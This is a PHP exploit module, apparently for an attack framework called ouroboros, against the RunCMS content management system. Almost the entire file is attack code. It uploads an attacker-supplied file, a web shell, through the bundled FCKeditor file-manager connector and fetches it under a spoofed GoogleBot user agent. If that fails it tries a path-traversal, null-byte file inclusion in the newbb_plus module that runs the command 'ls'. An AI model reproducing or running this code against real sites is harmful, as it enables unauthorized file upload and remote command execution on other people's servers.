<?php

/*
  RunCMS Exploit, by RGod, modified as an ouroboros module by Nomenumbra
*/

class runcms extends Xploit {

function Sploit($host,$port,$path,$filename,$filecontent)
{
  $upload_command= 'FileUpload';  
  $shellpath = $host."/UserFiles/file/".$filename;
  $dAtA="-----------------------------7d529a1d23092a\r\n";
  $dAtA.="Content-Disposition: form-data; name=\"NewFile\"; filename=\"$filename\"\r\n";
  $dAtA.="Content-Type:\r\n\r\n";
  $dAtA.="$filecontent\r\n";
  $dAtA.="-----------------------------7d529a1d23092a--\r\n";
  $pAcKeT="POST ".$path."class/fckeditor/editor/filemanager/browser/default/connectors/php/";
  $pAcKeT.="connector.php?Command=".$upload_command."&Type=File&CurrentFolder= HTTP/1.1\r\n";
  $pAcKeT.="Content-Type: multipart/form-data; boundary=---------------------------7d529a1d23092a\r\n";
  $pAcKeT.="User-Agent: GoogleBot \r\n";
  $pAcKeT.="Host: ".$host."\r\n";
  $pAcKeT.="Content-Length: ".strlen($dAtA)."\r\n";
  $pAcKeT.="Connection: Close\r\n\r\n";
  $pAcKeT.=$dAtA;
  $HtMl = sendpacket($host,$port,$pAcKeT);
  $packet="GET ".$shellpath." HTTP/1.1\r\n";
  $packet.="User-Agent: GoogleBot/1.1\r\n";
  $packet.="Host: ".$host."\r\n";
  $packet.="Connection: Close\r\n\r\n";
  $html = sendpacket($host,$port,$packet);
  if (eregi($MAIN['signature'],$html))
    return true;        
  else
  {
    $packet="GET ".$p."modules/newbb_plus/class/class.forumposts.php?";
    $packet.="cmd=ls&bbPath[path]=".$back."../../..".$shellpath."%00 HTTP/1.1\r\n";
    $packet.="Host: ".$host."\r\n";
    $packet.="Connection: Close\r\n\r\n";
    $html = sendpacket($host,$port,$packet);
    if (eregi($MAIN['signature'],$html))
      return true; 
    else
      return false;
   }                            
}  

}


?>